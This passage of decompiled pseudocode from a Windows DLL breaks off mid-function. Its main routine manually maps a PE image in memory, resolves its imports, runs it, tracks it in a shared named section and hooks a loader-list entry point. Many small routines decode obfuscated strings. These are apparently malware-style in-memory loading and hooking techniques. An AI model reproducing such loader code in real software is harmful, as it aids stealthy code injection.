LABEL_79:
  v55 = v60 | (v63 != 0 ? 0x80000000 : 0) | (v5 << (31 - dword_10092474));
  if ( dword_10092478 == 64 )
  {
    v56 = v61;
    a2[1] = v55;
    *a2 = v56;
  }
  else if ( dword_10092478 == 32 )
  {
    *a2 = v55;
  }
  return result;
}
// 10092468: using guessed type int dword_10092468;
// 1009246C: using guessed type int dword_1009246C;
// 10092470: using guessed type int dword_10092470;
// 10092474: using guessed type int dword_10092474;
// 10092478: using guessed type int dword_10092478;
// 1009247C: using guessed type int dword_1009247C;

//----- (1005B6E8) --------------------------------------------------------
int __stdcall sub_1005B6E8(int a1, int a2, int a3)
{
  unsigned int v3; // edi
  int v4; // eax
  int v5; // ecx
  _DWORD **v6; // esi
  int v7; // ebx

  v3 = 0;
  v4 = 268809977;
  v5 = 100;
  do
  {
    --v4;
    if ( !--v5 )
      return 1;
  }
  while ( *(_DWORD *)v4 != -267535686 );
  v6 = (_DWORD **)(v4 + 4);
  v7 = v4;
  if ( !(*(int (__stdcall **)(_DWORD, int))(v4 + 8))(**(_DWORD **)(v4 + 4), -1) )
  {
    do
    {
      if ( (*v6)[v3 + 3] )
        ((void (__stdcall *)(_DWORD, int, int))(*v6)[v3 + 3])((*v6)[v3 + 2], a2, a3);
      v3 += 136;
    }
    while ( v3 < 5440 );
    (*(void (__stdcall **)(_DWORD))(v7 + 12))(**v6);
  }
  return ((int (__stdcall *)(int, int, int))(*v6)[1])(a1, a2, a3);
}

//----- (1005B76B) --------------------------------------------------------
int __stdcall sub_1005B76B(int a1)
{
  int v2; // eax
  int (__stdcall *v3)(int, int, int *, _DWORD); // eax
  int v4; // ebx
  int v5; // eax
  int v6; // edi
  _DWORD *v7; // eax
  unsigned int v8; // edx
  int v9; // ecx
  unsigned __int16 v10; // dx
  unsigned int v11; // edi
  unsigned __int16 v12; // dx
  unsigned int v13; // edi
  int v14; // eax
  _DWORD *v15; // eax
  int v16; // edi
  int *k; // edi
  int v18; // eax
  int v19; // eax
  int v20; // ecx
  int v21; // ecx
  int v22; // ebx
  bool v23; // zf
  void (__stdcall *v24)(int, _DWORD, _DWORD); // ebx
  int v25; // eax
  int v26; // eax
  _DWORD *v27; // edi
  _DWORD *v28; // eax
  _DWORD *m; // ebx
  _DWORD *v30; // eax
  int *v31; // eax
  unsigned int v32; // edx
  int *v33; // ecx
  int v34; // ebx
  int v36; // [esp-8h] [ebp-7Ch]
  int v37; // [esp-4h] [ebp-78h]
  char v38[4]; // [esp+10h] [ebp-64h] BYREF
  int v39; // [esp+14h] [ebp-60h]
  int v40; // [esp+28h] [ebp-4Ch] BYREF
  int v41; // [esp+2Ch] [ebp-48h]
  int v42; // [esp+30h] [ebp-44h]
  int v43; // [esp+34h] [ebp-40h]
  _DWORD *v44; // [esp+38h] [ebp-3Ch]
  int v45; // [esp+3Ch] [ebp-38h]
  _DWORD *v46; // [esp+40h] [ebp-34h]
  int v47; // [esp+44h] [ebp-30h] BYREF
  int v48; // [esp+48h] [ebp-2Ch]
  int v49; // [esp+4Ch] [ebp-28h]
  int v50; // [esp+50h] [ebp-24h]
  int v51; // [esp+54h] [ebp-20h]
  void (__stdcall *v52)(int, _DWORD, _DWORD); // [esp+58h] [ebp-1Ch]
  int v53; // [esp+5Ch] [ebp-18h] BYREF
  int v54; // [esp+60h] [ebp-14h]
  int v55; // [esp+64h] [ebp-10h]
  int v56; // [esp+68h] [ebp-Ch]
  char v57; // [esp+6Eh] [ebp-6h]
  char v58; // [esp+6Fh] [ebp-5h]
  int v59; // [esp+7Ch] [ebp+8h]
  int i; // [esp+7Ch] [ebp+8h]
  unsigned int v61; // [esp+7Ch] [ebp+8h]
  _DWORD *j; // [esp+7Ch] [ebp+8h]
  int v63; // [esp+7Ch] [ebp+8h]
  char v64; // [esp+7Fh] [ebp+Bh]

  v40 = 0;
  v41 = 0;
  v42 = 0;
  v57 = 0;
  v55 = 0;
  v58 = 0;
  v54 = 0;
  v46 = 0;
  v48 = 0;
  v49 = 0;
  v50 = 0;
  v45 = 0;
  v47 = 0;
  v52 = 0;
  v53 = 0;
  v2 = (*(int (__stdcall **)(int))(a1 + 16))(a1 + 1140);
  v43 = v2;
  if ( !v2 )
    return 0;
  v3 = (int (__stdcall *)(int, int, int *, _DWORD))(*(int (__stdcall **)(int, int))(a1 + 28))(v2, a1 + 1153);
  if ( !v3 )
    return 0;
  if ( !v3(a1 + 1206, 1, &v53, 0) )
    return 0;
  v41 = v53;
  v4 = *(_DWORD *)(a1 + 2920) + a1 + 2860;
  v40 = 12;
  v42 = 0;
  if ( (*(_DWORD *)(v4 + 8) & 0xFFFFF807) - 695205888 > 0x6000000 )
    return 0;
  v59 = *(_DWORD *)(v4 + 80);
  if ( *(_BYTE *)(a1 + 2336) )
  {
    v5 = (*(int (__stdcall **)(int, unsigned int, int, _DWORD, int, _DWORD, _DWORD))(a1 + 80))(
           a1 + 2338,
           0x80000000,
           1,
           0,
           3,
           0,
           0);
    v56 = v5;
    if ( v5 == -1 )
      return 0;
    v51 = (*(int (__stdcall **)(int, _DWORD, int, _DWORD, int, _DWORD))(a1 + 40))(v5, 0, 16777218, 0, v59, 0);
    (*(void (__stdcall **)(int))(a1 + 76))(v56);
    if ( !v51 )
      return 0;
    v6 = (*(int (__stdcall **)(int, int, _DWORD, _DWORD, int))(a1 + 48))(v51, 4, 0, 0, v59);
    v56 = v6;
    (*(void (__stdcall **)(int))(a1 + 76))(v51);
  }
  else
  {
    v6 = (*(int (__stdcall **)(_DWORD, _DWORD, int, int))(a1 + 4))(0, *(_DWORD *)(v4 + 80), 4096, 4);
    v56 = v6;
  }
  if ( !v6 )
    return 0;
  if ( (*(int (__stdcall **)(int, int, int, int *))(a1 + 12))(v6, v59, 4, &v47) )
  {
    (*(void (__cdecl **)(int, _DWORD, _DWORD))(a1 + 36))(v6, 0, *(_DWORD *)(v4 + 80));
    (*(void (__cdecl **)(int, int, _DWORD))(a1 + 32))(v6, a1 + 2860, *(_DWORD *)(v4 + 84));
    for ( i = 0; (unsigned __int16)i < *(_WORD *)(v4 + 6); ++i )
      (*(void (__cdecl **)(int, int, _DWORD))(a1 + 32))(
        v6 + *(_DWORD *)(40 * (unsigned __int16)i + v4 + 260),
        a1 + 2860 + *(_DWORD *)(40 * (unsigned __int16)i + v4 + 268),
        *(_DWORD *)(40 * (unsigned __int16)i + v4 + 264));
    v51 = v6 - *(_DWORD *)(v4 + 52);
    if ( v51 )
    {
      v7 = (_DWORD *)(v6 + *(_DWORD *)(v4 + 160));
      if ( v7 == (_DWORD *)v6 )
        goto LABEL_84;
      v8 = (unsigned int)v7 + *(_DWORD *)(v4 + 164);
      v44 = (_DWORD *)v8;
      while ( (unsigned int)v7 < v8 )
      {
        v61 = 0;
        v9 = v6 + *v7;
        if ( ((v7[1] - 8) & 0xFFFFFFFE) != 0 )
        {
          do
          {
            v10 = *((_WORD *)v7 + v61 + 4);
            v11 = v10;
            v12 = v10 & 0xFFF;
            v13 = v11 >> 12;
            if ( v13 )
            {
              if ( v13 != 3 )
                goto LABEL_84;
              *(_DWORD *)(v9 + v12) += v51;
            }
            ++v61;
          }
          while ( v61 < (unsigned int)(v7[1] - 8) >> 1 );
          v8 = (unsigned int)v44;
        }
        v7 = (_DWORD *)((char *)v7 + v7[1]);
        v6 = v56;
      }
    }
    v14 = v6 + *(_DWORD *)(v4 + 128);
    if ( v14 != v6 )
    {
      if ( *(_DWORD *)(v14 + 12) )
      {
        v15 = (_DWORD *)(v14 + 16);
        for ( j = v15; *v15; v15 = j )
        {
          if ( *(v15 - 3) )
            goto LABEL_84;
          v16 = v56 + *(v15 - 1);
          if ( !(*(int (__stdcall **)(int))(a1 + 24))(v16) )
            goto LABEL_84;
          v51 = (*(int (__stdcall **)(int))(a1 + 16))(v16);
          if ( !v51 )
            goto LABEL_84;
          for ( k = (int *)(v56 + *j); *k; ++k )
          {
            if ( *k >= 0 )
              v18 = v56 + *k + 2;
            else
              v18 = (unsigned __int16)*k;
            v19 = (*(int (__stdcall **)(int, int))(a1 + 28))(v51, v18);
            *k = v19;
            if ( !v19 )
              goto LABEL_84;
          }
          j += 5;
          if ( !*(j - 1) )
            break;
        }
      }
      v63 = 0;
      if ( *(_WORD *)(v4 + 6) )
      {
        while ( 1 )
        {
          v20 = *(_DWORD *)(40 * (unsigned __int16)v63 + v4 + 284);
          if ( (v20 & 0x20000020) != 0 )
            v48 = 1;
          if ( v20 < 0 )
            v49 = 1;
          if ( (v20 & 0x40000000) != 0 )
            v50 = 1;
          v21 = 1;
          if ( v48 )
          {
            v21 = v49 ? 64 : v50 != 0 ? 32 : 16;
          }
          else if ( v50 )
          {
            v21 = 2 * (v49 != 0) + 2;
          }
          if ( !(*(int (__stdcall **)(int, _DWORD, int, int *))(a1 + 12))(
                  v56 + *(_DWORD *)(40 * (unsigned __int16)v63 + v4 + 260),
                  *(_DWORD *)(40 * (unsigned __int16)v63 + v4 + 256),
                  v21,
                  &v47) )
            break;
          if ( (unsigned __int16)++v63 >= *(_WORD *)(v4 + 6) )
            goto LABEL_56;
        }
      }
      else
      {
LABEL_56:
        v22 = *(_DWORD *)(v4 + 40);
        v23 = v56 + v22 == 0;
        v24 = (void (__stdcall *)(int, _DWORD, _DWORD))(v56 + v22);
        v52 = v24;
        if ( !v23 && ((int (__stdcall *)(int, int, _DWORD))v24)(v56, 1, *(_DWORD *)(a1 + 2332)) == 1 )
        {
          v45 = 1;
          v25 = (*(int (__stdcall **)(int *, _DWORD, int))(a1 + 68))(&v40, 0, a1 + 618);
          v55 = v25;
          if ( v25 )
          {
            if ( !(*(int (__stdcall **)(int, int))(a1 + 72))(v25, -1) )
            {
              v58 = 1;
              v54 = (*(int (__stdcall **)(int, _DWORD, int))(a1 + 44))(983071, 0, a1 + 96);
              v64 = 0;
              if ( v54
                || (v64 = 1,
                    (v54 = (*(int (__stdcall **)(int, int *, int, _DWORD, int, int))(a1 + 40))(
                             -1,
                             &v40,
                             4,
                             0,
                             21768,
                             a1 + 96)) != 0) )
              {
                v26 = (*(int (__stdcall **)(int, int, _DWORD, _DWORD, int))(a1 + 48))(v54, 2, 0, 0, 21768);
                v27 = (_DWORD *)v26;
                v46 = (_DWORD *)v26;
                if ( v26 )
                {
                  if ( !v64 )
                  {
LABEL_78:
                    v31 = 0;
                    v32 = 0;
                    v33 = v27 + 2;
                    while ( !v31 )
                    {
                      if ( !*v33 )
                        v31 = v33;
                      ++v32;
                      v33 += 136;
                      if ( v32 >= 0x28 )
                      {
                        if ( !v31 )
                          goto LABEL_84;
                        break;
                      }
                    }
                    v34 = v56;
                    v31[1] = (int)v52;
                    *v31 = v34;
                    v31[2] = 1;
                    v31[3] = *(_DWORD *)(a1 + 2332);
                    *((_BYTE *)v31 + 16) = *(_BYTE *)(a1 + 2336);
                    v31[135] = *(_DWORD *)(a1 + 2320);
                    (*(void (__cdecl **)(int, int, int))(a1 + 32))((int)v31 + 18, a1 + 1796, 522);
                    if ( v64 )
                    {
                      v27 = 0;
                      v54 = 0;
                      (*(void (__stdcall **)(int))(a1 + 56))(v55);
                      v55 = 0;
                      v58 = 0;
                    }
                    goto LABEL_87;
                  }
                  (*(void (__cdecl **)(int, _DWORD, int))(a1 + 36))(v26, 0, 21768);
                  v49 = 0;
                  while ( 1 )
                  {
                    v44 = (_DWORD *)(*(int (__stdcall **)(int))(a1 + 20))(a1 + 1274);
                    if ( !v44 )
                      break;
                    if ( ++v49 >= 5 )
                    {
                      if ( (unsigned int)(*(int (__stdcall **)(int, _DWORD, char *, int, _DWORD))(a1 + 60))(
                                           -1,
                                           0,
                                           v38,
                                           24,
                                           0) >= 0xC0000000 )
                      {
                        (*(void (__stdcall **)(int, _DWORD, char *, int, _DWORD))(a1 + 60))(-1, 0, v38, 24, 0);
                        break;
                      }
                      v28 = (_DWORD *)(*(_DWORD *)(v39 + 12) + 12);
                      for ( m = (_DWORD *)*v28; m != v28; m = (_DWORD *)*m )
                      {
                        if ( (_DWORD *)m[6] == v44 )
                        {
                          v27[1] = m[7];
                          v30 = (_DWORD *)(*(int (__stdcall **)(_DWORD, int, int, int))(a1 + 4))(
                                            0,
                                            *(_DWORD *)(a1 + 2328) + 20,
                                            4096,
                                            64);
                          if ( !v30 )
                            goto LABEL_84;
                          v30[4] = *(_DWORD *)(a1 + 32);
                          v30[3] = *(_DWORD *)(a1 + 56);
                          v30[2] = *(_DWORD *)(a1 + 72);
                          *v30 = -267535686;
                          v30[1] = v27;
                          v37 = *(_DWORD *)(a1 + 2328);
                          v36 = *(_DWORD *)(a1 + 2324);
                          v44 = v30 + 5;
                          (*(void (__cdecl **)(_DWORD *, int, int))(a1 + 32))(v30 + 5, v36, v37);
                          m[7] = v44;
                          break;
                        }
                      }
                      if ( v27[1] )
                      {
                        *v27 = v55;
                        goto LABEL_78;
                      }
                      break;
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
LABEL_84:
  v27 = v46;
  v34 = v56;
  v57 = 1;
LABEL_87:
  if ( v27 )
    (*(void (__stdcall **)(_DWORD *))(a1 + 52))(v27);
  if ( v54 )
    (*(void (__stdcall **)(int))(a1 + 76))(v54);
  if ( v58 )
    (*(void (__stdcall **)(int))(a1 + 56))(v55);
  if ( v55 )
    (*(void (__stdcall **)(int))(a1 + 76))(v55);
  (*(void (__stdcall **)(int))(a1 + 84))(v43);
  if ( v53 )
    (*(void (__stdcall **)(int))(a1 + 92))(v53);
  if ( v57 )
  {
    if ( v45 && v52 )
      v52(v34, 0, 0);
    if ( *(_BYTE *)(a1 + 2336) )
      (*(void (__stdcall **)(int))(a1 + 52))(v34);
    else
      (*(void (__stdcall **)(int, _DWORD, int))(a1 + 8))(v34, 0, 0x8000);
    return 0;
  }
  return v34;
}
// 1005B76B: using guessed type char var_64[4];

//----- (1005BD6F) --------------------------------------------------------
int __userpurge sub_1005BD6F@<eax>(int a1@<edi>, int a2)
{
  int v3; // eax
  int v4; // eax
  int v5; // edi
  unsigned int v6; // eax
  _DWORD *v7; // edx
  unsigned int v8; // eax
  int v10; // eax
  int v12; // [esp+8h] [ebp-10h]
  void (__stdcall *v13)(_DWORD, _DWORD, _DWORD); // [esp+Ch] [ebp-Ch]
  int v14; // [esp+10h] [ebp-8h]
  char v15; // [esp+17h] [ebp-1h]
  int v16; // [esp+20h] [ebp+8h]

  v14 = 0;
  v13 = 0;
  v15 = 0;
  if ( a2 )
  {
    v3 = (*(int (__stdcall **)(int, _DWORD, int))a2)(2031617, 0, a2 + 618);
    v16 = v3;
    if ( v3 )
    {
      if ( !(*(int (__stdcall **)(int, int))(a2 + 72))(v3, -1) )
      {
        v4 = (*(int (__stdcall **)(int, _DWORD, int))(a2 + 44))(983071, 0, a2 + 96);
        v12 = v4;
        if ( v4 )
        {
          v5 = (*(int (__stdcall **)(int, int, _DWORD, _DWORD, int, int))(a2 + 48))(v4, 2, 0, 0, 21768, a1);
          if ( v5 )
          {
            v6 = 0;
            v7 = (_DWORD *)(v5 + 8);
            while ( *v7 != *(_DWORD *)(a2 + 1144) )
            {
              ++v6;
              v7 += 136;
              if ( v6 >= 0x28 )
                goto LABEL_13;
            }
            v8 = v5 + 544 * v6;
            if ( (*(_DWORD *)(v8 + 16))-- == 1 )
            {
              v13 = *(void (__stdcall **)(_DWORD, _DWORD, _DWORD))(v8 + 12);
              v15 = *(_BYTE *)(v8 + 24);
              (*(void (__cdecl **)(unsigned int, _DWORD, int))(a2 + 36))(v8 + 8, 0, 544);
            }
            else
            {
              v14 = 1;
            }
LABEL_13:
            (*(void (__stdcall **)(int))(a2 + 52))(v5);
          }
          (*(void (__cdecl **)(int))(a2 + 76))(v12);
        }
        (*(void (__stdcall **)(int))(a2 + 56))(v16);
      }
      (*(void (__stdcall **)(int))(a2 + 76))(v16);
      if ( v13 )
      {
        v13(*(_DWORD *)(a2 + 1144), 0, 0);
        if ( *(_BYTE *)(a2 + 1140) )
        {
          v14 = 1;
          if ( v15 )
            v10 = (*(int (__stdcall **)(_DWORD))(a2 + 52))(*(_DWORD *)(a2 + 1144));
          else
            v10 = (*(int (__stdcall **)(_DWORD, _DWORD, int))(a2 + 8))(*(_DWORD *)(a2 + 1144), 0, 0x8000);
          if ( !v10 )
            return 0;
        }
        else
        {
          return (v15 != 0) + 2;
        }
      }
    }
  }
  return v14;
}

//----- (1005BEA2) --------------------------------------------------------
void __cdecl sub_1005BEA2(int a1)
{
  int v2; // edi
  int v3; // eax
  void (__cdecl *v4)(int, int); // eax
  int v5; // [esp-4h] [ebp-14h]
  int v6; // [esp+18h] [ebp+8h]

  v5 = *(_DWORD *)(a1 + 24);
  v6 = *(_DWORD *)(a1 + 4);
  v2 = (*(int (__cdecl **)(int, _DWORD, int))a1)(2032639, 0, v5);
  v3 = (*(int (__cdecl **)(int))(a1 + 12))(a1 + 28);
  if ( v3 )
  {
    v4 = (void (__cdecl *)(int, int))(*(int (__cdecl **)(int, int))(a1 + 16))(v3, a1 + 39);
    if ( v4 )
      v4(v2, a1 + 20);
  }
  __asm { retn }
}
// 1005BEFE: unbalanced stack, ignored a potential tail call

//----- (1005BF08) --------------------------------------------------------
int __stdcall sub_1005BF08(int a1)
{
  int v1; // ebx
  void (__stdcall *v2)(int); // esi
  int (__stdcall *v3)(int); // edi
  int v4; // eax

  v1 = *(_DWORD *)(a1 + 12);
  v2 = *(void (__stdcall **)(int))(a1 + 4);
  v3 = *(int (__stdcall **)(int))(a1 + 8);
  (*(void (__stdcall **)(int, _DWORD, int))a1)(a1, 0, 0x8000);
  v4 = v3(v1);
  v2(v4);
  return 0;
}

//----- (1006B527) --------------------------------------------------------
int sub_1006B527()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_100916C0);
  sub_10009D2C(dword_100950F0, v0);
  return atexit(sub_1006CC3F);
}
// 100950F0: using guessed type _DWORD dword_100950F0[2];

//----- (1006B549) --------------------------------------------------------
int sub_1006B549()
{
  sub_10009D2C(dword_10095050, &word_10091728);
  dword_10095058 = 0;
  sub_10009D2C(dword_1009505C, &word_10091724);
  dword_10095064 = 0;
  sub_10002228(dword_10095068, 0);
  sub_10002228(dword_10095078, 0);
  sub_10002228(dword_10095088, 0);
  sub_10002228(dword_10095098, 0);
  sub_10002228(dword_100950A8, 0);
  sub_10002228(dword_100950B8, 0);
  sub_10002228(dword_100950C8, 0);
  return atexit(sub_1006CC49);
}
// 10095050: using guessed type _DWORD dword_10095050[2];
// 10095058: using guessed type int dword_10095058;
// 1009505C: using guessed type _DWORD dword_1009505C[2];
// 10095064: using guessed type int dword_10095064;
// 10095068: using guessed type _DWORD dword_10095068[4];
// 10095078: using guessed type _DWORD dword_10095078[4];
// 10095088: using guessed type _DWORD dword_10095088[4];
// 10095098: using guessed type _DWORD dword_10095098[4];
// 100950A8: using guessed type _DWORD dword_100950A8[4];
// 100950B8: using guessed type _DWORD dword_100950B8[4];
// 100950C8: using guessed type _DWORD dword_100950C8[4];

//----- (1006B608) --------------------------------------------------------
int sub_1006B608()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_10091730);
  sub_10009D2C(dword_100950F8, v0);
  return atexit(sub_1006CC54);
}
// 100950F8: using guessed type _DWORD dword_100950F8[2];

//----- (1006B62A) --------------------------------------------------------
int sub_1006B62A()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_10091790);
  sub_10009D2C(dword_10095100, v0);
  return atexit(sub_1006CC5E);
}
// 10095100: using guessed type _DWORD dword_10095100[2];

//----- (1006B64C) --------------------------------------------------------
int sub_1006B64C()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_100917F0);
  sub_10009D2C(dword_10095034, v0);
  return atexit(sub_1006CC68);
}
// 10095034: using guessed type _DWORD dword_10095034[2];

//----- (1006B66E) --------------------------------------------------------
int sub_1006B66E()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_10091888);
  sub_10009D2C(dword_100950E0, v0);
  return atexit(sub_1006CC72);
}
// 100950E0: using guessed type _DWORD dword_100950E0[2];

//----- (1006B690) --------------------------------------------------------
int sub_1006B690()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_100918E8);
  sub_10009D2C(dword_100950E8, v0);
  return atexit(sub_1006CC7C);
}
// 100950E8: using guessed type _DWORD dword_100950E8[2];

//----- (1006B6B2) --------------------------------------------------------
int sub_1006B6B2()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_10091950);
  sub_10009D2C(dword_10095108, v0);
  return atexit(sub_1006CC86);
}
// 10095108: using guessed type _DWORD dword_10095108[2];

//----- (1006B6D4) --------------------------------------------------------
int sub_1006B6D4()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_10091990);
  sub_10009D2C(dword_100950D8, v0);
  return atexit(sub_1006CC90);
}
// 100950D8: using guessed type _DWORD dword_100950D8[2];

//----- (1006B6F6) --------------------------------------------------------
int sub_1006B6F6()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_100919E0);
  sub_10009D2C(dword_1009503C, v0);
  return atexit(sub_1006CC9A);
}
// 1009503C: using guessed type _DWORD dword_1009503C[2];

//----- (1006B718) --------------------------------------------------------
int sub_1006B718()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_10091A28);
  sub_10009D2C(dword_1009502C, v0);
  return atexit(sub_1006CCA4);
}
// 1009502C: using guessed type _DWORD dword_1009502C[2];

//----- (1006B73A) --------------------------------------------------------
int sub_1006B73A()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_10091854);
  sub_10009D2C(dword_10095044, v0);
  return atexit(sub_1006CCAE);
}
// 10095044: using guessed type int dword_10095044[3];

//----- (1006B75C) --------------------------------------------------------
int sub_1006B75C()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_10091A78);
  sub_10009D2C(dword_10095024, v0);
  return atexit(sub_1006CCB8);
}
// 10095024: using guessed type _DWORD dword_10095024[2];

//----- (1006B77E) --------------------------------------------------------
int sub_1006B77E()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_10091AC0);
  sub_10009D2C(dword_1009501C, v0);
  return atexit(sub_1006CCC2);
}
// 1009501C: using guessed type _DWORD dword_1009501C[2];

//----- (1006B7A0) --------------------------------------------------------
int sub_1006B7A0()
{
  sub_10009D2C(&dword_100957A4, &word_100918E4);
  return atexit(sub_1006CCD6);
}
// 100957A4: using guessed type int dword_100957A4;

//----- (1006B7BB) --------------------------------------------------------
int sub_1006B7BB()
{
  sub_100027A6(dword_100957AC);
  return atexit(sub_1006CCCC);
}
// 100957AC: using guessed type _DWORD dword_100957AC[2];

//----- (1006B7D3) --------------------------------------------------------
int sub_1006B7D3()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008FE68);
  sub_10009D2C(dword_10095408, v0);
  return atexit(sub_1006CCE0);
}
// 10095408: using guessed type _DWORD dword_10095408[2];

//----- (1006B7F5) --------------------------------------------------------
int sub_1006B7F5()
{
  wchar_t *v0; // eax
  wchar_t *v1; // eax
  wchar_t *v2; // eax
  wchar_t *v3; // eax
  wchar_t *v4; // eax
  wchar_t *v5; // eax
  wchar_t *v6; // eax
  wchar_t *v7; // eax
  wchar_t *v8; // eax
  wchar_t *v9; // eax
  wchar_t *v10; // eax
  wchar_t *v11; // eax
  wchar_t *v12; // eax
  wchar_t *v13; // eax
  wchar_t *v14; // eax
  wchar_t *v15; // eax
  wchar_t *v16; // eax
  wchar_t *v17; // eax
  wchar_t *v18; // eax
  wchar_t *v19; // eax
  wchar_t *v20; // eax
  wchar_t *v21; // eax
  wchar_t *v22; // eax
  wchar_t *v23; // eax
  wchar_t *v24; // eax
  wchar_t *v25; // eax
  wchar_t *v26; // eax
  wchar_t *v27; // eax
  wchar_t *v28; // eax
  wchar_t *v29; // eax
  wchar_t *v30; // eax
  wchar_t *v31; // eax
  wchar_t *v32; // eax
  wchar_t *v33; // eax
  wchar_t *v34; // eax
  wchar_t *v35; // eax
  wchar_t *v36; // eax
  wchar_t *v37; // eax
  wchar_t *v38; // eax
  wchar_t *v39; // eax
  wchar_t *v40; // eax
  wchar_t *v41; // eax
  wchar_t *v42; // eax
  wchar_t *v43; // eax
  wchar_t *v44; // eax
  wchar_t *v45; // eax
  wchar_t *v46; // eax
  wchar_t *v47; // eax
  wchar_t *v48; // eax
  wchar_t *v49; // eax
  wchar_t *v50; // eax
  wchar_t *v51; // eax
  wchar_t *v52; // eax
  wchar_t *v53; // eax
  wchar_t *v54; // eax
  wchar_t *v55; // eax
  wchar_t *v56; // eax
  wchar_t *v57; // eax
  wchar_t *v58; // eax
  wchar_t *v59; // eax
  wchar_t *v60; // eax
  wchar_t *v61; // eax
  wchar_t *v62; // eax
  wchar_t *v63; // eax
  wchar_t *v64; // eax
  wchar_t *v65; // eax
  wchar_t *v66; // eax
  wchar_t *v67; // eax
  wchar_t *v68; // eax
  wchar_t *v69; // eax
  wchar_t *v70; // eax
  wchar_t *v71; // eax
  wchar_t *v72; // eax
  wchar_t *v73; // eax
  wchar_t *v74; // eax
  wchar_t *v75; // eax
  wchar_t *v76; // eax
  wchar_t *v77; // eax
  wchar_t *v78; // eax
  wchar_t *v79; // eax
  wchar_t *v80; // eax
  wchar_t *v81; // eax
  wchar_t *v82; // eax
  wchar_t *v83; // eax
  wchar_t *v84; // eax
  wchar_t *v85; // eax
  wchar_t *v86; // eax
  wchar_t *v87; // eax
  wchar_t *v88; // eax
  wchar_t *v89; // eax
  wchar_t *v90; // eax
  wchar_t *v91; // eax
  wchar_t *v92; // eax
  wchar_t *v93; // eax
  wchar_t *v94; // eax

  v0 = (wchar_t *)sub_1000BE16((int)&unk_10091680);
  sub_10009D2C(dword_10095110, v0);
  v1 = (wchar_t *)sub_1000BE16((int)&unk_10091648);
  sub_10009D2C(dword_10095118, v1);
  v2 = (wchar_t *)sub_1000BE16((int)&unk_1009160C);
  sub_10009D2C(dword_10095120, v2);
  v3 = (wchar_t *)sub_1000BE16((int)&unk_100915D0);
  sub_10009D2C(dword_10095128, v3);
  v4 = (wchar_t *)sub_1000BE16((int)&unk_10091590);
  sub_10009D2C(dword_10095130, v4);
  v5 = (wchar_t *)sub_1000BE16((int)&unk_10091550);
  sub_10009D2C(dword_10095138, v5);
  v6 = (wchar_t *)sub_1000BE16((int)&unk_10091510);
  sub_10009D2C(dword_10095140, v6);
  v7 = (wchar_t *)sub_1000BE16((int)&unk_100914D4);
  sub_10009D2C(dword_10095148, v7);
  v8 = (wchar_t *)sub_1000BE16((int)&unk_10091494);
  sub_10009D2C(dword_10095150, v8);
  v9 = (wchar_t *)sub_1000BE16((int)&unk_10091458);
  sub_10009D2C(dword_10095158, v9);
  v10 = (wchar_t *)sub_1000BE16((int)&unk_10091418);
  sub_10009D2C(dword_10095160, v10);
  v11 = (wchar_t *)sub_1000BE16((int)&unk_100913E0);
  sub_10009D2C(dword_10095168, v11);
  v12 = (wchar_t *)sub_1000BE16((int)&unk_10091398);
  sub_10009D2C(dword_10095170, v12);
  v13 = (wchar_t *)sub_1000BE16((int)&unk_1009135C);
  sub_10009D2C(dword_10095178, v13);
  v14 = (wchar_t *)sub_1000BE16((int)&unk_10091320);
  sub_10009D2C(dword_10095180, v14);
  v15 = (wchar_t *)sub_1000BE16((int)&unk_100912E0);
  sub_10009D2C(dword_10095188, v15);
  v16 = (wchar_t *)sub_1000BE16((int)&unk_100912A0);
  sub_10009D2C(dword_10095190, v16);
  v17 = (wchar_t *)sub_1000BE16((int)&unk_10091264);
  sub_10009D2C(dword_10095198, v17);
  v18 = (wchar_t *)sub_1000BE16((int)&unk_10091218);
  sub_10009D2C(dword_100951A0, v18);
  v19 = (wchar_t *)sub_1000BE16((int)&unk_100911DC);
  sub_10009D2C(dword_100951A8, v19);
  v20 = (wchar_t *)sub_1000BE16((int)&unk_100911A0);
  sub_10009D2C(dword_100951B0, v20);
  v21 = (wchar_t *)sub_1000BE16((int)&unk_10091160);
  sub_10009D2C(dword_100951B8, v21);
  v22 = (wchar_t *)sub_1000BE16((int)&unk_10091124);
  sub_10009D2C(dword_100951C0, v22);
  v23 = (wchar_t *)sub_1000BE16((int)&unk_100910E8);
  sub_10009D2C(dword_100951C8, v23);
  v24 = (wchar_t *)sub_1000BE16((int)&unk_100910A8);
  sub_10009D2C(dword_100951D0, v24);
  v25 = (wchar_t *)sub_1000BE16((int)&unk_10091068);
  sub_10009D2C(dword_100951D8, v25);
  v26 = (wchar_t *)sub_1000BE16((int)&unk_10091028);
  sub_10009D2C(dword_100951E0, v26);
  v27 = (wchar_t *)sub_1000BE16((int)&unk_10090FE8);
  sub_10009D2C(dword_100951E8, v27);
  v28 = (wchar_t *)sub_1000BE16((int)&unk_10090FAC);
  sub_10009D2C(dword_100951F0, v28);
  v29 = (wchar_t *)sub_1000BE16((int)&unk_10090F70);
  sub_10009D2C(dword_100951F8, v29);
  v30 = (wchar_t *)sub_1000BE16((int)&unk_10090F38);
  sub_10009D2C(dword_10095200, v30);
  v31 = (wchar_t *)sub_1000BE16((int)&unk_10090EFC);
  sub_10009D2C(dword_10095208, v31);
  v32 = (wchar_t *)sub_1000BE16((int)&unk_10090EC4);
  sub_10009D2C(dword_10095210, v32);
  v33 = (wchar_t *)sub_1000BE16((int)&unk_10090E88);
  sub_10009D2C(dword_10095218, v33);
  v34 = (wchar_t *)sub_1000BE16((int)&unk_10090E4C);
  sub_10009D2C(dword_10095220, v34);
